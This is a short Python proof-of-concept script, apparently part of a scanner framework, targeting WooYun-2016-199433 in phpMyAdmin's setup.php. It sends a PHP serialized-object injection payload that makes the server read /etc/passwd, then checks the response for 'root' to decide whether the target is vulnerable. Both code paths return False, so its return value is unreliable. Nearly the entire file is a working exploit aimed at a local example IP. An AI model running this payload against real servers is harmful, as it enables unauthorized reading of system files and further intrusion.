#!/usr/bin/python3

'''
name: WooYun-2016-199433漏洞
description: WooYun-2016-199433漏洞
'''

from app.lib.utils.request import request

class WooYun_2016_199433_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload = 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            req = request.post(self.url + '/scripts/setup.php', headers = self.headers, data = self.payload)
            if req.status_code == 200 and 'phpMyAdmin' in req.headers['Set-Cookie'] and 'root' in req.text:
                print('存在WooYun-2016-199433漏洞')
                return False
            else:
                print('不存在WooYun-2016-199433漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在WooYun-2016-199433漏洞')
            return False

if  __name__ == "__main__":
    WooYun_2016_199433 = WooYun_2016_199433_BaseVerify('http://192.168.30.242:8080')
    WooYun_2016_199433.run()

